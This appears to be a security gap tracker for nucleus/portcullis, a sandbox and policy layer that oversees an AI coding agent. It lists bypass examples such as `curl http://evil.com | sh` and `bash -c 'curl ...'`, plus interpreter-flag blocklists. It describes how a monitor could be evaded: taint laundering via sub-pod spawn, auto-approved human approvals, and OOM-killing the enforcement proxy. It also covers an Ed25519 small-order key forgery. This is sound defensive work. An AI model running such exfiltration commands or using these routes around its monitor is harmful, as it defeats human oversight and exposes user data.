# Security TODOs (Policy -> Physics gaps)

Scope: documents current enforcement gaps and test/assurance deficits across `portcullis`, `nucleus`, and `nucleus-cli`. Each item includes a concrete TODO and a Definition of Done (DoD) that prefers guarantees (fuzzing, property tests, formal methods) when practical.

## 1) Process execution not budget-enforced

Deficiency
- `nucleus::Executor` never charges or checks budget during command execution. Budget is tracked only in `nucleus-cli` after process completion (best-effort). This makes budget enforcement non-atomic with side effects.
Refs: `crates/nucleus/src/command.rs:30`, `crates/nucleus/src/command.rs:73`, `crates/nucleus-cli/src/run.rs:187`

Impact
- A process can run and incur costs even if it should have been blocked for budget exhaustion.

TODO
- Integrate `AtomicBudget` checks into `Executor::run` / `run_with_timeout` before spawning.
- Define a charge model (static per command, or dynamic per output size / duration) and enforce it pre-exec or via reservation.

DoD (guarantees)
- Property tests: budget never exceeds max under concurrent `Executor` usage.
- Fuzz: command strings + randomized budgets must not permit execution when insufficient.
- Negative test: for any budget=0, `Executor::run` must always fail with a budget error.
Status
- Partial: `Executor` reserves budget using a base + per-second model when a time guard/timeout is present; output-based costs and refunds still pending.

## 2) Capability levels are not enforced for file I/O

Deficiency
- `nucleus::Sandbox` checks only `PathLattice` patterns. It does not check `CapabilityLattice` levels (read/write/edit).
Refs: `crates/nucleus/src/sandbox.rs:45`, `crates/nucleus/src/sandbox.rs:218`

Impact
- A policy that forbids `write_files` can still write through `Sandbox::write`, because only path patterns are enforced.

TODO
- Add capability checks to all `Sandbox` methods (read/write/open/create/remove/dir). Decide on a capability mapping table and require it in `Sandbox::new` or per method.

DoD (guarantees)
- Property tests: for any capability state with `write_files < LowRisk`, any write/remove must fail.
- Unit tests: explicit denial for write/edit/remove when `CapabilityLevel::Never` or approval-required without a token.
- If approval callbacks are required, type-level enforcement (guard token) or explicit runtime error must be present.
Status
- Done (runtime): `Sandbox` enforces read/write/edit capabilities with approval callbacks.

## 3) Command exfiltration detection is program-name only

Deficiency
- `Executor::check_uninhabitable` detects network exfiltration by checking the first argv token against a small hardcoded list. `bash -c`, `python -c`, `node -e`, etc. can bypass this.
Refs: `crates/nucleus/src/command.rs:237`, `crates/nucleus/src/command.rs:282`

Impact
-  Uninhabitable state can be completed via indirect shell invocation without detection.

TODO
- Extend detection to include shell-based indirection and common runtime executors.
- Option: disallow `* -c` by default, or treat any `bash/sh/zsh/pwsh/python/node/ruby` as network-capable unless allowlisted.

DoD (guarantees)
- Adversarial tests: `bash -c 'curl ...'`, `python -c '...requests...'`, `node -e '...fetch...'` are blocked under uninhabitable state.
- Fuzz: generate command strings; ensure any network-capable flow under uninhabitable state is denied.
Status
- Partial: default command lattice now blocks common interpreter flags (`bash -c`, `python -c`, `node -e`, etc.); broader coverage and fuzzing pending.

## 4) Command allowlist/blocklist is string-based and permissive mode is bypassable

Deficiency
- `CommandLattice::can_execute` relies on substring checks and `shell_words` tokenization. In permissive mode (empty allowlist), only blocked substrings are enforced.
Refs: `crates/portcullis/src/command.rs:77`, `crates/portcullis/src/command.rs:133`, `crates/portcullis/src/command.rs:191`

Impact
- Command strings with extra args or indirection can bypass intended blocks (e.g., `curl http://evil.com | sh` vs `curl | sh`).

TODO
- Upgrade policy to structured command patterns (program + args) rather than substring matching.
- Consider separate policies for shell, pipelines, and redirection; optionally forbid shell metacharacters entirely.

DoD (guarantees)
- Property tests over parsed argv: forbidden program+arg patterns must never pass even with quoting/spacing.
- Fuzz: command strings with random quoting and separators should not bypass forbidden patterns.
Status
- Partial: added shell metacharacter blocking in permissive mode and subsequence checks for blocked patterns; full structured command patterns still pending.

## 5) ν (nucleus) is not automatically applied to constructed permissions

Deficiency
- `PermissionLattice` can be created via builder or struct literal without normalization. ν is applied only in `meet/join` or if callers manually apply constraint.
Refs: `crates/portcullis/src/lattice.rs:199`, `crates/portcullis/src/lattice.rs:214`, `crates/portcullis/src/lattice.rs:228`, `crates/portcullis/src/lattice.rs:479`

Impact
- Callers can create a permissive lattice that violates the uninhabitable state and use it directly.

TODO
- Provide a `normalize()`/`nucleus()` constructor that applies the constraint and use it in all builders and presets.
- Option: make fields private and require constructors that apply ν.

DoD (guarantees)
- Property tests: `normalize(normalize(x)) == normalize(x)` (idempotent), `x <= y => normalize(x) <= normalize(y)` (monotone), `normalize(x) <= x` (deflationary).
- Construction tests: all public constructors yield `ν(x) = x` (safe).
Status
- Done (runtime): constructors/builders now apply `normalize()` when uninhabitable state is enabled; property tests for ν are added at the capability level.

## 6) Approval requirements are trivially auto-approvable

Deficiency
- Approval obligations can still be automated (e.g., always-approve callbacks), even though execution now requires explicit approval tokens.
Refs: `crates/nucleus/src/command.rs:61`, `crates/nucleus/src/command.rs:383`

Impact
- Human-in-the-loop requirement can be bypassed by callers.

TODO
- Require a structured approval interface (e.g., signed decisions, explicit audit record, or typed approval token).
- Consider making approvals non-bypassable by requiring a guard token that cannot be constructed externally.

DoD (guarantees)
- Compile-time: approval-gated operations require an approval token type that cannot be forged.
- Runtime: approvals must be logged with operation details and a verifier.
Status
- Done (type-level): approval-gated operations require approval tokens (`ApprovalToken`) to execute; callbacks only mint tokens.

## 7) Path sandboxing is string-based in `PathLattice`

Deficiency
- `PathLattice` performs canonicalization and glob matching on strings. Unicode normalization, symlink race conditions, and Windows path oddities are not exhaustively tested.
Refs: `crates/portcullis/src/path.rs:117`, `crates/portcullis/src/path.rs:175`, `crates/portcullis/tests/adversarial.rs:93`

Impact
- Policy checks may be bypassed via path quirks. `Sandbox` mitigates some issues via capability handles, but sensitive-path blocking still relies on strings.

TODO
- Add tests and optional platform-specific normalization (Unicode NFC/NFKC).
- Add symlink-escape tests and ensure behavior is correct on all supported OSes.

DoD (guarantees)
- Fuzz: path inputs (including unicode normalization forms) never permit blocked paths.
- Adversarial tests: symlink escapes and `..` traversal never bypass policy.
Status
- Partial: symlink escape test added for work_dir; unicode/Windows cases and fuzzing pending.

## 8) Enforcement split between `nucleus` and `nucleus-cli`

Deficiency
- `nucleus-cli` spawns `claude` directly and uses `--allowedTools` rather than enforcing via `Executor` and `Sandbox` APIs.
Refs: `crates/nucleus-cli/src/run.rs:111`, `crates/nucleus-cli/src/run.rs:159`

Impact
- Enforcement is policy-as-config; OS-level side effects are not gated by the nucleus runtime in CLI mode.

TODO
- Route tool execution through `nucleus` enforcement layer or implement a wrapper that enforces `Sandbox` and `Executor` for all side effects.

DoD (guarantees)
- Integration tests: commands that violate policy are blocked even if the model attempts them.
- End-to-end tests in CI: forbidden operations never occur in CLI execution.
Status
- Partial: enforced CLI path now runs Claude via MCP + `nucleus-tool-proxy`; unsafe direct mode remains behind `--unsafe-allow-claude`.

## 9) Formalization and proofs are missing

Deficiency
- ν properties (idempotence, monotonicity, deflationary, meet-preserving) are described but not formally verified.
Refs: `crates/portcullis/src/lib.rs:19`, `crates/portcullis/src/lib.rs:26`

Impact
- Subtle regressions can silently break lattice guarantees.

TODO
- Add a small formal spec (Lean/Coq/Isabelle) of the core lattice + ν and map it to Rust.
  See `docs/assurance/formal-methods.md` for the target plan.

DoD (guarantees)
- Machine-checked proofs for ν laws.
- CI gate that fails if proofs no longer check.
Status
- Done: ν-law guarantees (E1-E7: exposure monotonicity, trace monotonicity, denial monotonicity, auth boundary, capability coverage, budget monotonicity, delegation ceiling) are carried by Lean 4 kernel-checked proofs + Kani BMC harnesses (114 repo-wide). **Verus was removed** — there is no `crates/portcullis-verified` and no `.github/workflows/verus.yml`; the surviving artifact is the `verus_conformance.rs` proptest suite. CI proof gates: `kani-nightly.yml` (Kani) and `portcullis-core-proven-lean.yml` (Lean proven-tier `lake build` + `sorry`-ban; fails if proofs no longer check). See `crates/portcullis/tests/verus_conformance.rs`, `.github/workflows/kani-nightly.yml`, `.github/workflows/portcullis-core-proven-lean.yml`.

## 10) Fuzzing coverage gaps

Deficiency
- No `cargo-fuzz` targets for command parsing, path normalization, or policy deserialization.
Refs: `crates/portcullis/tests/proptest_lattice.rs:1`, `Cargo.toml:1`

Impact
- Parser and matcher bugs may allow bypasses or panics in adversarial inputs.

TODO
- Add fuzz targets:
  - `PathLattice::can_access` with random paths and unicode.
  - `CommandLattice::can_execute` with random command strings.
  - `PermissionLattice` serde round-trip.

DoD (guarantees)
- Fuzz CI: minimum corpus size + time budget.
- No crashes, no false-allow for known forbidden patterns.
Status
- Done (CI-gated): 3 fuzz targets (command_can_execute, path_can_access, permission_serde) run in CI with 30s time budget each. Fuzz is a required merge check on main. See `fuzz/`, `.github/workflows/ci.yml`.

## 11) Sub-pod spawn was unmediated by the information-flow monitor (audit C-1 / #1207)

Deficiency
- `create_sub_pod` spawned a child compartment and injected orchestrator credentials without consulting the session `FlowTracker`. A fresh child tracker starts clean, so a parent that had ingested adversarial/web content could launder its accumulated taint across the sub-pod boundary (confused-deputy subagent spawn). The monotonic `session_taint_ceiling` (#1207) and `check_action_safety_with_ceiling` had no production caller on this path.
Refs: `crates/nucleus-tool-proxy/src/pod_mgmt.rs` (`create_sub_pod`, `sub_pod_ifc_gate`)

Impact
- Integrity/confidentiality non-interference held only within the single-process kernel path, not across the sub-pod boundary — a live bypass of "complete mediation".

TODO
- [DONE] Gate `create_sub_pod` on the parent `FlowTracker` via the same egress gate the kernel uses (`portcullis::exposure_core::ifc_egress_denial`, `ManagePods` → `OutboundAction`), failing closed before credential injection or any node call.
- [WON'T-FIX / not-live] Intra-process fresh-tracker leg: `mcp.rs:171` constructs a new `FlowTracker` per MCP server. Audited: this is NOT a live laundering seam because the MCP-stdio and HTTP front-ends are MUTUALLY EXCLUSIVE within one process. `--mcp` is documented as mutually exclusive with the HTTP server (`crates/nucleus-tool-proxy/src/main.rs:256-260`) and, when set, `main.rs:1427` does `return mcp::run_mcp_server(...)` — an early return that exits `main` before the axum HTTP `Router` (and its long-lived per-session `FlowTracker`) is ever constructed. The two `FlowTracker`s are therefore never co-live in one process; there is no intra-process path that resets/replaces a long-lived HTTP tracker with the MCP one mid-session, so there is no taint-laundering boundary to gate. (If a future change makes both front-ends co-live in one process, this leg must be re-opened.)
- [OPEN] Defense in depth: consult `session_taint_ceiling` / `check_action_safety_with_ceiling` in the live integrity gate so per-node `is_tainted()` is not the only check.

DoD (guarantees)
- [DONE] Unit tests (`pod_mgmt::ifc_gate_tests`): a web-tainted parent and a poisoned parent are both denied `IfcDenied`; a clean parent passes. The gate is a private fn called only from `create_sub_pod`, so dropping the call fails the warnings-denied build.
- [OPEN] E2E adversarial-corpus test: over HTTP, taint a session (web_fetch) then attempt `create_sub_pod` and assert deny + no node call + no credential forwarding.

Status
- Partial: the spawn-call-site bypass is closed and regression-tested; the intra-process fresh-tracker leg is closed as WON'T-FIX / not-live (MCP-stdio and HTTP front-ends are mutually exclusive per process — see the leg above), leaving only the ceiling-wiring defense-in-depth open. The "complete mediation now holds" claim is intentionally NOT asserted in README/FORMAL_METHODS until that leg closes.
## 12) Tool-proxy could be OOM-killed by an attacker-controlled response body (audit H-1)

Deficiency
- `web_fetch`, the MCP fetch path, and `web_search` buffered the ENTIRE upstream body (`response.bytes()/.json()`) before applying `web_fetch_max_bytes`, which only truncated what was already allocated. A malicious upstream (the untrusted-content leg of the lethal-trifecta threat model) streaming a huge/Content-Length-lying body caused unbounded allocation → OOM-kill of the tool-proxy. Because the tool-proxy IS the enforcement point, its death runs the agent unmonitored (fail-open).
Refs: `crates/nucleus-tool-proxy/src/main.rs` (`read_body_capped`, web_fetch, web_search), `crates/nucleus-tool-proxy/src/mcp.rs`

TODO
- [DONE] Stream every attacker-influenced body through `read_body_capped`, which stops at `web_fetch_max_bytes` and never retains more than the cap (+ one chunk) regardless of upstream size / Content-Length.
- [DONE] H-3 panic/poison leg — CRITICAL two-class fix (a naive uniform `into_inner()` would turn a fail-closed DoS into a fail-OPEN taint-undercount, which is worse). The two classes:
  - **DECISION locks fail CLOSED, never `into_inner()`.** In `crates/portcullis/src/guard.rs` every `.read()/.write()` on the `exposure` / `executed_ops` accumulators (`RuntimeStateGuard::check` / `execute_and_record` / `accumulated_risk`, `GradedExposureGuard::check` / `execute_and_record` / `accumulated_risk` / `exposure`) now maps a `PoisonError` to a fail-closed denial: `check()` → `GuardError::Denied{reason: "…poisoned…"}`; `execute_and_record()` → `ExecuteError::TocTouDenied` (closure already ran, so the op is treated as denied); `accumulated_risk()` → `StateRisk::Uninhabitable` (max); `exposure()` → the maximal (fully-uninhabitable) `ExposureSet`. RATIONALE: the exposure accumulator is monotone-union (taint only added), so recovering a torn write via `into_inner()` could UNDER-COUNT taint and ALLOW an action that must DENY — a fail-open. Mirrors the kernel poison-gate (`crates/portcullis/src/kernel/ifc.rs:34`, `is_poisoned()`).
  - **AUDIT / METRICS locks RECOVER and continue** (`crates/portcullis/src/audit.rs`, `crates/portcullis/src/metrics.rs`): `.expect("lock poisoned")` → `.unwrap_or_else(|e| e.into_inner())`. RATIONALE: these run AFTER the guarded action (record/metrics); the log is append-only and cannot fabricate/suppress a decision, so a poisoned audit lock must NOT brick recording — recovering accountability is strictly safer here than failing closed.
  - **Router panic net — fail-closed 500.** `tower_http::catch_panic::CatchPanicLayer::custom(fail_closed_panic_response)` added as the OUTERMOST layer (last `.layer()` = outermost/first-to-see-request) on both axum routers: `crates/nucleus-tool-proxy/src/main.rs` and `crates/nucleus-verifier-service/src/app.rs`. The handler returns HTTP 500 DENY, never a reset/allow. `catch-panic` feature enabled on both crates' `tower-http`. (OOM is not catchable by `catch_unwind`; that leg is the bounded allocation above.)

DoD (guarantees)
- [DONE] `read_body_capped_tests` (wiremock): a 4 MiB upstream body against a 64 KiB cap yields exactly the cap with `truncated=true`; a small body round-trips untruncated. Fails if reverted to whole-body buffering.
- [DONE] `guard::tests::test_decision_lock_poison_denies_graded_check` / `…_runtime_check` / `…_execute_and_record_fails_closed` (portcullis): poison the `exposure` decision lock (panic while holding the write guard via `catch_unwind`), then assert `check()`/`execute_and_record()` return a fail-CLOSED deny — NOT a panic, NOT an allow, NOT a torn-state allow. These FAIL if anyone swaps `into_inner()` onto a decision lock (it would return `Ok`). Serves as the H-3 adversarial regression (the IFC-flow JSON corpus can't express fault injection).
- [DONE] `audit::tests::test_audit_lock_poison_recovers_and_records` (portcullis): poison the audit lock, then `record(...)` still appends (seq 2, total 2) without panicking — recover-and-continue.
- [DONE] `panic_net_tests::panicking_handler_returns_fail_closed_500_and_keeps_serving` (nucleus-tool-proxy + nucleus-verifier-service): a request to a panicking route behind `CatchPanicLayer` returns HTTP 500 (fail-closed), and a subsequent normal request still returns 200.

Status
- [DONE] Both legs closed and regression-tested: the OOM/allocation leg (bounded `read_body_capped`) and the panic/poison leg (H-3, two-class lock policy + router panic net). Still does NOT claim "monitor is un-killable" (SIGKILL / OOM-kill of the process is out of scope for `catch_unwind`).

## 13) Transparency-log cosignature not enforced on the production trust path (audit C-3) — CLOSED (2026-09-04)

Deficiency
- `verify_binding_in_log` (witness-cosigned STH + inclusion proof) is called only in tests; the production `federation.rs` path (`apply_to_store`) authenticates inbound JWT-SVIDs directly from the on-disk `FederationSet` with no cosignature check. Anyone who can write the registry tree gets keys served for identity verification (forged foreign identities authenticate). This is the highest-severity remaining finding.
Refs: `crates/nucleus-trust-registry/src/federation.rs:25-48`, `tlog.rs` (`verify_binding_in_log`)

Status
- Was DEFERRED by owner decision (2026-07-17) pending two calls. Both were made on 2026-09-04 (owner directive to burn down the remaining audit items) and enforcement is wired:
  - Witness model: **single pinned cosigner** — the crate's stated MVP trust base (`lib.rs` "Honest caveat #3"); k-of-n stays the documented drop-in. The consumer pins the key out of band in a `LogAttestation`; the artifact's embedded copy is only cross-checked, never trusted alone.
  - Rollout: **hard fail-closed, no warn-then-enforce and no unverified entry point**. `build_federation_store` / `apply_to_store` take a `LogAttestation` and refuse any binding the cosigned log does not prove (`tlog::verify_binding_inclusion`: recompute leaf → inclusion proof against the cosigned STH root → witness cosignature). Verification runs for EVERY binding before any store write, so one unproven binding federates nothing. A deployment without a `SealedLog` cannot build a store — that is the breaking change, accepted.
- Format change: `StoredInclusion` now records `(trust_domain, ts)` per leaf so a consumer holding only the compiled registry can re-derive the leaf. The fields are REQUIRED; a pre-change sealed log fails to parse (`sealed_log_without_leaf_ts_is_refused_at_parse`) rather than silently failing verification. Re-seal with `nucleus-trust-registry log-append`.
- Pinned by `tests/enrollment_e2e.rs`: `neg_store_refuses_binding_absent_from_cosigned_log`, `neg_store_refuses_wrong_pinned_cosigner`, `neg_one_unproven_binding_federates_nothing`, and the positive pipeline now builds its store through the attestation.

## 14) Ed25519 re-verify used non-strict `verify()` on three trust-path sites (audit M-2)

Deficiency
- Three Ed25519 re-verify sites on the trust path called non-strict `vk.verify(...)` instead of `vk.verify_strict(...)`. Non-strict verification uses the cofactored equation and does not reject small-order / non-canonical public keys, so a single signature can verify under multiple identities (key-substitution / weak binding). The core already used `verify_strict`; these three were the inconsistency.
Refs: `crates/nucleus-receipt/src/lib.rs:187` (`Receipt::verify`), `crates/nucleus-verifier-service/src/auth.rs:86` (`verify_detached_ed25519`), `crates/nucleus-witness/src/cosign.rs:134` (`verify_cosign_line`).

Impact
- On the receipt colimit-identity path, the detached-signature agent-auth path, and the witness cosignature path, an attacker presenting the Ed25519 identity/neutral key could get a crafted "identity-triple" signature to verify, breaking strong binding of signature → identity.

TODO
- [DONE] Swapped all three sites from `vk.verify(msg, &sig)` to `vk.verify_strict(msg, &sig)` (each `vk` is an `ed25519_dalek::VerifyingKey`; same call signature, strictly stronger — rejects small-order/non-canonical A and R). Removed the now-unused `ed25519_dalek::Verifier` trait import from each of the three modules (`verify_strict` is an inherent method).

Strong-binding rationale + tests
- [DONE] Regression tests prove strong binding at EACH site (one per crate), each with two assertions: (i) an honest dalek keypair still verifies through the site's public path (no regression); (ii) a signature presented against the SMALL-ORDER Ed25519 identity/neutral verifying key (`[1, 0, …, 0]`) with the identity-triple signature (`R` = identity encoding, `s` = 0) is REJECTED. That triple satisfies the cofactored verification equation for every message, so non-strict `verify()` ACCEPTS it while `verify_strict()` rejects it — empirically confirmed under the pinned `ed25519-dalek =3.0.0-pre.7` (a standalone run showed `verify().is_ok() == true` AND `verify_strict().is_err() == true` for the identity triple). Each site test FAILS if the site is reverted to non-strict `verify()` (verified by temporarily reverting `nucleus-receipt`, whose test then panicked on assertion (ii)).
  - `crates/nucleus-receipt/src/lib.rs` → `tests::small_order_key_is_rejected_by_verify_strict`
  - `crates/nucleus-verifier-service/src/auth.rs` → `auth::tests::small_order_key_is_rejected_by_verify_strict`
  - `crates/nucleus-witness/src/cosign.rs` → `cosign::tests::small_order_key_is_rejected_by_verify_strict`
- Note: the three crates have no dedicated adversarial/small-order corpus module to extend; the small-order case is carried by the per-site unit tests above.

Status
- [DONE] All three sites use `verify_strict`; new + existing suites pass (`cargo test -p nucleus-receipt -p nucleus-verifier-service -p nucleus-witness`), `cargo fmt` clean, `cargo clippy` on the three crates has no new warnings.
- SUBSUMED by item 15 (audit M-3), which completes the whole class (every remaining dalek trust-path re-verify) and adds a CI grep-gate so the property cannot silently regress. The three M-2 sites and their tests are unchanged and remain covered by the gate.

## 15) Ed25519 non-strict `verify()` — remainder of the class + CI ratchet (audit M-3)

Deficiency
- Beyond the three M-2 sites, the rest of the codebase still had `ed25519_dalek::VerifyingKey::verify(msg, &sig)` (non-strict, cofactored) on production trust paths. Non-strict verification accepts small-order / non-canonical public keys and `R` points, so the Ed25519 identity/neutral key with an "identity-triple" signature verifies under any message → key-substitution / weak signature-to-identity binding. M-3 finishes the class (converts every remaining dalek site to `verify_strict`) and installs a durable CI gate.

TODO — conversions (all [DONE])
- Swapped `vk.verify(msg, &sig)` → `vk.verify_strict(msg, &sig)` at every production dalek trust-path re-verify below, and removed the now-unused `ed25519_dalek::Verifier` trait import from each module (`verify_strict` is an inherent method, so the deny-warnings build stays clean). `verify_strict` is strictly stronger — it additionally rejects small-order/non-canonical `A` and `R`.
  - `crates/nucleus-verifier-service/src/witness.rs:162` (peer STH cosignature verify)
  - `crates/nucleus-witness/src/server.rs:249` (trusted-key STH signature verify)
  - `crates/nucleus-oidc-provider/src/token.rs:237` (subject_token / JWT-SVID — identity trust root)
  - `crates/nucleus-provenance/src/lib.rs:230` (DSSE attestation signature verify)
  - `crates/nucleus-node-binding/src/lib.rs:148` (node↔principal passport binding verify)
  - `crates/nucleus-provenance-memory/src/declassify.rs:172` (threshold human-auth declassify cosignature — HIGH value)
  - `crates/nucleus-control-plane-server/src/auth.rs:259` (control-plane JWT-SVID auth — identity trust root; found by workspace sweep, not in the original M-3 list)
  - `crates/nucleus-externality/src/claim.rs:137` (oracle claim signature verify; found by sweep)
  - `crates/nucleus-witness-gossip/src/lib.rs:119` (`verify_head` cosignature/v1 verify; found by sweep)
  - `crates/nucleus-witness-olog/src/pin.rs:139` (pinned-log checkpoint signature verify; found by sweep)
  - `crates/nucleus-witness-olog/src/manifest.rs:140` (accumulation-manifest signature verify; found by sweep)
  - `crates/nucleus-witness-olog/src/bond.rs:200` (bond evidence signature verify; found by sweep)

Wrapper `.verify(...)` methods traced to their inner dalek call — already strict, no change:
- `nucleus-receipt::Receipt::verify` (`lib.rs:187`, from M-2), reached via `nucleus-recompute::verify_signed_clearing` and `nucleus-agent-card` e2e — inner call is `verify_strict`.
- `nucleus-lineage::SignedTreeHead::verify` → `Ed25519Witness::verify_canonical` (`checkpoint.rs:273,308`) — `verify_strict`. Reached via `nucleus-lineage::merkle::verify_log` and `nucleus-envelope::verify.rs:904`.

SKIPs (with justification)
- Every `portcullis` verify site — `certificate.rs` (authority/block/PoP ~923/949/983), `token_sign.rs:50`, `receipt_sign.rs:72`, `manifest_registry.rs:99/141` — and `nucleus-identity::approval_bundle.rs:425` (reached via `nucleus-tool-proxy/src/main.rs:583`): these verify with **`ring` (`UnparsedPublicKey` + `signature::ED25519`), not `ed25519-dalek`**. `ring` exposes no `verify_strict`, so the M-3 mechanism does not apply. NOTE: these are NOT already safe — see the sibling finding below.
- `crates/nucleus-agent-card/src/jwk.rs:134`: **P-256 ECDSA (ES256)** via `p256::ecdsa` (`VerifyingKey::from_sec1_bytes`), not Ed25519.
- `portcullis` `galois.rs` / `intent.rs` `connection.verify(l, r)` / `bridge.verify(...)`: Galois-connection lattice check, not a signature verify.
- `portcullis` `escalation.rs` / `receipt_chain.rs` / `token.rs` `chain.verify()` / `token.verify(now, depth)`: hash-chain + ring signature wrappers, no dalek path.
- Test-only dalek `.verify(...)`: `nucleus-oidc-provider` `issuer.rs:686`, `keystore/memory.rs:238/275`, `keystore/rotator.rs:240`; `nucleus-lineage/src/file_signer.rs:145`; and all `crates/*/tests/` integration tests. `#[cfg(test)]` / test-dir only — not a production trust path.
- Signing (not verifying) calls (`.sign(...)`): out of scope by definition.

CI grep-gate (the durable ratchet) — [DONE]
- `scripts/check-verify-strict.sh` (+ commented allowlist `scripts/verify-strict-allowlist.txt`), wired into `.github/workflows/ci.yml` as job `verify-strict` ("Ed25519 verify_strict gate (M-3)"). It scans only files importing `ed25519_dalek`, strips `#[cfg(test)]` blocks and `tests/`/`benches/` dirs and comment lines, and FAILS (exit 1) on any two-argument `.verify(_, &sig)` that is not `verify_strict` and not in the allowlist. Prefers `rg`, falls back to POSIX `grep`.
- PROVEN TO BITE: planting `.verify(&canonical_claim_bytes(claim), &sig)` back into `nucleus-externality/src/claim.rs` made the gate exit 1 and print the offending `file:line`; removing the plant returned it to exit 0 / PASSED.

Regression tests (identity-triple, `[1,0,…,0]` key + `R=identity‖s=0`) — [DONE]
- Three crown-jewel dalek paths, each driven through the site's REAL public function, each with (i) honest signature still verifies and (ii) identity-triple REFUSED; each FAILS if its site is reverted to non-strict (verified by temporary revert → assertion panic):
  - `crates/nucleus-oidc-provider/src/token.rs` → `token::tests::small_order_key_is_rejected_by_verify_strict` (full token-exchange handler; forged token otherwise valid → 400 invalid_grant under strict, would be 200 under non-strict).
  - `crates/nucleus-provenance-memory/src/declassify.rs` → `declassify::tests::small_order_key_is_rejected_by_verify_strict` (threshold declassify; forged cosignature must not reach the quorum).
  - `crates/nucleus-control-plane-server/src/auth.rs` → `auth::tests::small_order_key_is_rejected_by_verify_strict` (JWT-SVID auth; forged principal must be rejected). NOTE: substituted for the originally-suggested "portcullis certificate verify", which is a `ring` path (see sibling finding) with no `verify_strict` to guard.

Status
- [DONE] All 12 dalek sites use `verify_strict`; CI-gated by `scripts/check-verify-strict.sh`. `cargo test` green on all touched crates (`nucleus-node-binding`, `nucleus-verifier-service`, `nucleus-provenance`, `nucleus-oidc-provider`, `nucleus-provenance-memory`, `nucleus-witness`, `nucleus-witness-gossip`, `nucleus-witness-olog`, `nucleus-control-plane-server`, `nucleus-externality`); `cargo fmt --all --check` clean; `cargo clippy --all-targets -- -D warnings` clean on all touched crates.

## 16) [SIBLING of M-3, NEW — needs owner triage] `ring` Ed25519 trust-path verifies accept small-order/identity-triple signatures

Deficiency
- The `ring`-backed Ed25519 verifies (portcullis `certificate.rs`, `token_sign.rs`, `receipt_sign.rs`, `manifest_registry.rs`; `nucleus-identity::approval_bundle.rs`) have the SAME weak-binding weakness M-3 fixes for dalek, and it is NOT fixable with `verify_strict` (ring has no such API). Empirically confirmed under the repo's pinned `ring`: `UnparsedPublicKey::new(&signature::ED25519, [1,0,…,0]).verify(b"any message", &identity_triple)` returns `Ok` (`RING_DIRECT_IDENTITY_TRIPLE_ACCEPTED = true`), and `verify_certificate` with the identity root key passed the authority-signature check (it only later failed proof-of-possession because mutating the signature changed the block hash). So a delegation chain whose in-band `next_key` is set to the identity key can have the next hop "signed" by nobody, and any trust anchor pinned to the identity key is forgeable.
- Exploitability varies by site: certificate DELEGATION `next_key` travels in-band (attacker-influenced) → highest concern; `verify_certificate` root key, `TrustStore`, and token/receipt keys are caller-pinned (lower, but still weak-binding).

TODO
- [x] Option (b) chosen: migrate trust-path verifies to `ed25519-dalek::verify_strict`, signing stays on `ring`.
  - [x] `token_sign.rs`, `receipt_sign.rs` — migrated (earlier).
  - [x] `certificate.rs` (authority / per-block / proof-of-possession, the highest-concern in-band `next_key` site) — migrated in the certificate-convergence PR 1; `verify_ed25519_strict` is the single verify helper, pinned by `certificate_convergence_test::small_order_root_key_forgery_rejected`, which asserts (non-vacuously) that `ring` still accepts the identity triple and `verify_certificate` now refuses it.
  - [x] `manifest_registry.rs` (`TrustStore::verify`, `verify_manifest_signature`) — migrated to the shared `certificate::verify_ed25519_strict`; pinned by `manifest_registry::tests::crypto_tests::small_order_identity_triple_rejected` (asserts `ring` still accepts the identity triple, then that the trust store and the manifest verify refuse it).
  - [x] `ck-types::witness.rs` (witness-bundle signatures) and `ck-kernel::lib.rs` (human governance signatures) — found by the sweep below; migrated to `ck_types::witness::verify_ed25519_strict` (dalek `verify_strict`, single-variant `InvalidSignature` error).
  - [x] `scripts/check-verify-strict.sh` now has a second scan: any production reference to `ring::signature::ED25519` (the cofactored verifier) fails the gate, no allowlist, `#[cfg(test)]` blocks and `*_test.rs` files excluded. Verified to FAIL on the pre-migration tree and PASS after.
- `nucleus-identity::approval_bundle.rs:425` is **ECDSA P-256** (`ECDSA_P256_SHA256_FIXED`), not Ed25519; the small-order Ed25519 concern does not apply there. Listed in error by the original sweep.

Status
- CLOSED (2026-09-04). Every Ed25519 re-verify in the workspace is `verify_strict`; `ring` remains for signing only. The only production `ring::signature::ED25519` references left are inside test modules, which the gate strips.

---

# Architectural audit, 2026-09-09 (items 17–30)

A 20-question audit of whether nucleus's operational concepts are instances of shared
algebraic objects. The headline was not the algebra: **most of the unifications are
already built and machine-proven, and are not wired to the enforcement path.** Items
17–30 are the concrete defects that fell out. Each was checked against this file,
`docs/production-delta.md`, `docs/north-star.md`, `docs/PROOFS.md`,
`docs/architecture/mediated-set.md` and `docs/architecture/threat-model.md` before
being filed; where a prior entry covers adjacent ground it is named.

Four recurring classes, filed here so the class outlives the instances:
**(a)** silent eviction without a tombstone; **(b)** `&self` on an operation whose name
says it consumes; **(c)** proven-but-unwired; **(d)** two tables that must agree, and drift.

## 17) The isolation backend is chosen by an environment variable, not by the driver

Deficiency
- `isolation_backend()` selects the `BackendCapability` from `NUCLEUS_ISOLATION_BACKEND`, defaulting to `FIRECRACKER` — which declares the **full** lattice. A node run with `--driver container` or `--driver local` therefore clamps every pod against Firecracker's capabilities and writes `isolation.coproduct.one/backend=firecracker` into the spec labels, so `EnforcedIsolation::is_faithful()` returns true and the certificate the node mints carries that posture.
- Root cause is a missing arm, not a wrong design: the env var was introduced for the Apple-VZ case (its own doc comment says so) and `Container` was never given one. `DriverKind::Container` is **not** feature-gated (`crates/nucleus-node/Cargo.toml`, `default = []`; only `Local` sits behind `local-driver`), so this is reachable in a default production build.
Refs: `crates/nucleus-node/src/driver.rs:62`, `crates/nucleus-node/src/driver.rs:96`, `crates/portcullis/src/enforcement.rs:41`

Impact
- This is precisely the failure `crates/portcullis/src/enforcement.rs:17-20` was written to prevent — *"it never gets a token that claims `Filtered` while the platform silently allows the whole internet through NAT"* — reintroduced one call frame above it.

TODO
- Take the resolved `&DriverKind`; add `BackendCapability::CONTAINER` and `::LOCAL`, declared at the **minimum** and raised per dimension only with a citation to the code that enforces it.
- `require_isolation`'s `Unenforceable` arm is already written and already property-tested, and is currently unreachable. It is what turns a silent gap into a refusal.

DoD (guarantees)
- With the env var unset and `--driver container`, a pod requesting `Airgapped` is refused, and the refusal names the dimension. Perturb by restoring the env-var lookup → red.
- Blast radius measured first: every stock profile sets `minimum_isolation: None` (`crates/portcullis/src/profile.rs:440`), so few pods should be affected. Confirm by counting.

Status
